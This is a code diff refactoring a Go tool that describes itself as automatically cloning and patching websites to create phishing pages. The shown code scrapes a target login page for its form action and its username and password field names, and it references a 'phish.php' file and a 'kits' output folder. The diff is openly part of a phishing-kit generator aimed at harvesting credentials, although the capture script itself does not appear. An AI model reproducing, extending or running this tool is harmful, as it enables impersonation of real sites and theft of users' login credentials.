@@ -6,7 +6,6 @@ Automatically clone and patch simple websites to create phishing pages
 package main
 
 import (
-	"flag"
 	"fmt"
 	"net/url"
 	"os"
@@ -20,19 +19,15 @@ var (
 	urlin       string
 	agent       string
 	phpFilename string
-	asciiart    string = `
-           _           _   _     _
- _____  __| |_ ___ ___| |_|_|___| |_
-|     ||. | '_| -_| . |   | |_ -|   |
-|_|_|_|___|_|_|___|  _|_|_|_|___|_|_|
-                  |_|
-`
 )
 
-/* getFormPost(url string) (string, string, string): check if there is a post with an action in the url specified and returns:
+/*
+	getFormPost(url string) (string, string, string): check if there is a POST with an action, and returns:
+
 - path of the action of the form
 - name of the attribute for the login
-- name of the attribute for the password */
+- name of the attribute for the password
+*/
 func getFormPost(urlin string) (string, string, string) {
 
 	c := colly.NewCollector(colly.UserAgent(agent))
@@ -60,39 +55,22 @@ func getFormPost(urlin string) (string, string, string) {
 	return postPath, postLogin, postPassword
 }
 
-func main() {
+func initiateCollector(urlin string) {
 
-	// parse flag and cli inputs
-	flag.StringVar(&urlin, "url", "", "URL of login page")
-	flag.StringVar(&agent, "ua", "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0", "User Agent string")
-	flag.StringVar(&phpFilename, "php", "phish.php", "Path to the PHP file to be used")
-	flag.StringVar(&destFolder, "kits", "kits", "Path used to store the kits")
-
-	flag.Parse()
-
-	// check if url was provided
-	if urlin == "" {
-		fmt.Fprintf(os.Stderr, "\nEmpty URL, please specify a URL using the -url flag.\n")
-		os.Exit(1)
-
-		// remove / from end of url
-	} else if string(urlin[len(urlin)-1]) == "/" {
-		urlin = urlin[0 : len(urlin)-1]
-	}
-
-	fmt.Println(asciiart)
 	// Instantiate default collector
 	c := colly.NewCollector(colly.UserAgent(agent))
 
 	// get parameters of the form in the HTML
-	fmt.Printf("\nNavigating to %s using the following User agent: %s \n", urlin, agent)
+	fmt.Printf("Navigating to %s using the following user agent:\n%s", urlin, agent)
 	postPath, postLogin, postPassword := getFormPost(urlin)
 
 	if postPath == "" || postLogin == "" || postPassword == "" {
-		fmt.Fprintf(os.Stderr, "No compatible form found in the given URL!\n")
+		fmt.Fprintf(os.Stderr, "[!] error: no compatible form found in the given URL!\n")
 		os.Exit(1)
 	} else {
-		fmt.Printf("Parameters found in the form of the given URL:\n - post action = %s\n - login attribute name = %s\n - password attribute name = %s\n", postPath, postLogin, postPassword)
+		fmt.Printf("Parameters found in the form of the given URL:\n"+
+			"- post action = %s\n - login attribute name = %s\n - password attribute name ="+
+			" %s\n", postPath, postLogin, postPassword)
 	}
 
 	// If given URL does not have a form with a POST -> print error
